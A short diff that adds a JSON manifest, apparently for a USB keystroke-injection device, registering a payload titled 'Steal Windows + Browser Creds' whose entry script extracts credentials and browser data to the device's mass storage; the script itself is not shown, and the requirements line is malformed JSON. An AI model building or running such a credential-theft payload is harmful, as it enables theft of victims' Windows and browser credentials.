@@ -1,0 +1,7 @@
+{
+  "name": "Steal Windows + Browser Creds",
+  "summary": "Extracts credentials and browser data to MSD",
+  "entry": "hid/win_browser_creds.py",
+  "requirements": ["hid"], ["msd"],
+  "args": []
+}
